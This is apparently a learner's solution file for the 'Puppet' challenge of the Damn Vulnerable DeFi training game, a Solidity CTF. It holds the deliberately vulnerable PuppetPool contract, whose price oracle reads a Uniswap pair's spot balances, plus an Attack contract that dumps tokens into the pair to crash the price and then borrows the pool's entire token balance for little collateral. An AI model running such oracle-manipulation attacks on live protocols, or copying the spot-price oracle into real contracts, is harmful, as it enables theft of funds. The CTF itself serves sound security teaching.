// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";

contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant { // can i borroww everything
        uint256 depositRequired = calculateDepositRequired(amount); // how can i require everything for just 1 wei

        if (msg.value < depositRequired) {
            revert NotEnoughCollateral();
        }

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(recipient, amount)) {
            revert TransferFailed();
        }

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}


contract Attack {
    
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    constructor ( 
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
    }

    function attack (address recovery) external {
        //dump token to dvt
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uint256 eth_received = uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1e18, block.timestamp + 1 days);
        // console.log(eth_received, "*****9900695134061569016 ETH****");
        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE); // how can i require everything for just 1 wei
        // console.log(depositRequired, " (((( 19664329888798200000 ETH))))");
        // console.log(player.balance, "  (((( 34900695134061569016 ETH))))");
        lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
        // token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable{}

}